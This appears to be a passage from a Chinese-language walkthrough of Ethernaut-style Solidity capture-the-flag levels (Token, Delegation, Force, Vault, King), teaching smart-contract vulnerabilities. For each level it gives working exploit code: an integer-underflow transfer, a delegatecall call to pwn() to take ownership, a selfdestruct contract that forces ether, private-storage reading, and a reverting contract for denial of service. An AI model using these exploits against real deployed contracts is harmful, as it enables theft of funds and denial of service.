      }
    }
这个题考察整数溢出的问题，题目说明中告知初始已经给我们分配了20个token，所以我们只需要外部调用transfer函数，执行`transfer(instance,21)`，那么`balances[msg.sender]
- _value`的结果为-1，由于是uint类型，会变成$2^{256}-1$这样一个很大的数字，从而实现攻击，攻击代码如下：
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    interface Token {
        function transfer(address _to, uint _value) external returns (bool);
        function balanceOf(address _owner) external view returns (uint balance);
    }
    contract exploit {
      mapping(address => uint) balances;
      uint public mybalance;
      address target;
      Token token;
      event log(uint);
      //target设置为题目合约地址
      function setins(address _addr)public{
        target=_addr;
      }
        //_addr是instance地址，当然这里任何在balances中合法的其他地址都行，_value设置成21
        function exp(address _addr,uint _value) public {
            token=Token(target);
            token.transfer(_addr,_value);
        }
        //用来读余额，方便调试
        function getbalance(address _addr) public returns(uint){
            token=Token(target);
            mybalance=token.balanceOf(_addr);
            emit log(mybalance);
            return mybalance;
        }
    }
也可以在命令行直接传，如下所示：
# 6.Delegation
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Delegate {
      address public owner;
      constructor(address _owner) public {
        owner = _owner;
      }
      function pwn() public {
        owner = msg.sender;
      }
    }
    contract Delegation {
      address public owner;
      Delegate delegate;
      constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
      }
      fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
          this;
        }
      }
    }
本题首先需要了解一下solidity当中三种调用代码的特殊方式:`call`、`delegatecall`和`staticcall`
    .call(bytes memory) returns (bool, bytes memory)
使用给定的payload发出一个低级(low-level)的`CALL`命令，返回执行是否成功和数据，转发所有可用gas，可调整。
    .delegatecall(bytes memory) returns (bool, bytes memory)
使用给定payload发出一个低级的`DELEGATECALL`指令，返回执行是否成功和数据，转发所有可用gas，可调整。
    .staticcall(bytes memory) returns (bool, bytes memory)
使用给定payload发出一个低级的`STATICCALL`指令，返回执行是否成功和数据，转发所有可用gas，可调整。
官网三个指令说明几乎一模一样，他们之间的具体区别用一段代码来说明：
    pragma solidity ^0.4.23;
    contract Calltest {
        address public b;
        function test() public {
            b=address(this);
        }
    }
    contract Compare {
        address public b;
        address public testaddress;
        event logb(address _a);
        constructor(address _addressOfCalltest) public {
            testaddress = _addressOfCalltest;
        }
        function withcall() public {
            testaddress.call(bytes4(keccak256("test()")));
            emit logb(b);
        }
        function withdelegatecall() public {
            testaddress.delegatecall(bytes4(keccak256("test()")));
            emit logb(b);
        }
    }
首先部署一下`CallTest`合约，然后将合约地址作为`Compare`合约的构造参数进行部署。部署完成后，分别点击2个合约的b，可以看到都是`0x0000000000000000000000000000000000000000`
然后点击执行`withcall`函数，之后再分别点击b，查看结果，可以发现`CALLTEST`合约的b已经变成了这个合约的部署地址`0x0debB7DC73AE4ba3C7d740491a0bc0f8C63594c8`，而Compare合约的地址并没有变化。说明`call`只是在`CALLtest`合约中执行了test函数
再执行`withdelegatecall`函数，然后分别查看结果，可以看到此时`Compare`合约的b变成`Compare`合约的地址，即，我们在`Compare`合约中执行了test函数，而上面的`call`实际上还是在`CALLtest`合约中执行的test函数
如果部署后直接执行`withdelegatecall`，查看结果，可以发现只有`Compare`合约的b被改变了，也进一步印证了上面说的，`delegatecall`只在`Compare`合约内部执行了test函数，相当于test函数代码迁移到了Compare合约中执行了一下，这也是solidity实现类似库函数作用的方式。
回到本题，我们的目标就是通过delegatecall调用delegate合约的pwn函数，从而实现修改第一个合约的owner。这就涉及到call指定调用函数的操作，当给call传入的第一个参数时四个字节时，那么合约就会默认这四个字节是要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个字节，函数签名就是带有括号括起来的参数类型列表的函数名称。
所以只需要一行即可完成攻击：
    contract.sendTransaction({data:web3.utils.sha3("pwn()").slice(0,10)});
原理就是`sendTransaction`这个交易触发fallback函数，这里`msg.data`就是我们用类似json的形式指定的data，data放前四个字节即可。
>
> 还有一种调用方式就是上上面演示代码提到的`(bytes4(keccak256("test()")))`，keccak256和sha3是一样的，这样也可以获取到前4个字节。
这里`slice(0,10)`是因为前面还有个0x，加上0x一共10个字符。
# 7\. Force
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Force {/*
                       MEOW ?
             /\_/\   /
        ____/ o o \
      /~____  =ø= /
     (______)__m_m)
    */}
本题代码只有一个空合约，没有任何代码，看起来让人摸不着头脑。题目要求是让合约的余额大于0，这用到`selfdestruct`函数。这是一个自毁函数，当我们调用这个函数时，它会使合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数。（因为之前提到，如果合约收到一笔没有任何函数可以处理的资金时，就会调用fallback函数，而selfdestruct函数无视这一点，也就是资金会优先由selfdestruct函数处理）
步骤是：
  1. 首先部署一个调用`selfdestruct`函数的合约，例如
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Attack {
        uint b;
        event log(uint);
        constructor()public{
            b=0;
        }
        // 写receive函数是为了让这个合约接收一点ether，我在测试时如果只有下面的exploit函数转账一直失败
        // 当然也可以在创建合约时直接存入
        receive()payable external{
            b+=msg.value;
            emit log(b);
        }
      function exploit(address payable _target) public payable {
          selfdestruct(_target);
      }
    }
特别注意的一点是，这个函数必须有payable属性，否则这个合约时无法接收转账的。
  1. 往这个合约里存点钱，比如我的地址是`0xbB5D735088498AcaaCc24A99d5fd13f947A5879f`，直接使用Metamask往里面存。
  1. 然后执行exploit函数，设置地址为题目地址，selfdestruct后eth就强制到了题目地址上，从而完成题目要求。
# 8\. Vault
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract Vault {
      bool public locked;
      bytes32 private password;
      constructor(bytes32 _password) public {
        locked = true;
        password = _password;
      }
      function unlock(bytes32 _password) public {
        if (password == _password) {
          locked = false;
        }
      }
    }
这个题目代码很明显，就是需要我们获得合约中的password，然后调用unlock函数即可。这涉及到一点：以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量，我们可以使用`web3.eth.getStorageAt`来读取合约行对应地址的数据
    web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])
第一个参数时对应要读取的合约地址，第二个参数是要读取内容的索引位置(变量是第几个被定义的变量)，第三个参数如果被设置，那么就不会使用默认的block(被[web3.eth.defaultBlock](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock)设置的默认块)，而是使用用户自定义的块，这个参数可选项有`"earliest"`, `"latest"` 和
`"pending"`，第四个选项设置回调函数。
所以本题首先使用`await web3.eth.getStorageAt(contract.address,1)`读取password的内容(`await
web3.eth.getStorageAt(contract.address,0)`读取到的是locked变量的值)，然后使用`await
contract.unlock("A very strong secret password :)")`解锁即可，可以使用`await
contract.locked()`查看是否解锁。
注意一点是，web3.js不能自动把string解析成byte32类型，因此需要我们`web3.utils.asciiToHex`使用转换一下
换句话说,web3.js里`0x`开头的字符串可以被认为是bytes32
# 9\. King
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    contract King {
      address payable king;
      uint public prize;
      address payable public owner;
      constructor() public payable {
        owner = msg.sender;  
        king = msg.sender;
        prize = msg.value;
      }
      receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
      }
      function _king() public view returns (address payable) {
        return king;
      }
    }
很明显可以通过看到`receive`函数中只要我们满足require的条件，就可以篡改合约的`king`，查看合约新实例可以看到合约在创建时存入了0.001ether
因此我们只需转入0.01ether即可满足条件，而题目说明中告知，当我们submit instance
时本关会尝试回收“王权”，也就是它会传入一个更大的msg.value，修改king为原来的msg.sender，为了阻止这一点，我们可以通过在合约的`receive`或者`fallback`函数中加入revert函数来实现。
    pragma solidity ^0.6.0;
    contract AttackKing {
        constructor(address payable _victim) public payable {
            _victim.call.gas(1000000).value(1 ether)("");
        }
        receive() external payable {
            revert();
        }
    }
务必注意，因为我们创建的合约需要向题目合约转账，所以在创建合约时一定要选择1
ether的余额放进去，然后设置victim为题目合约地址，当submit题目打算回收“王权”时，它运行到`king.transfer(msg.value);`这一行时，由于king就是我们合约的地址，而我们合约的`receive`函数会执行revert，因此它会卡在这个状态无法执行，从而无法取回王权。
这个漏洞在实际合约中被用revert来执行DDos，让程序卡在某个状态无法运行。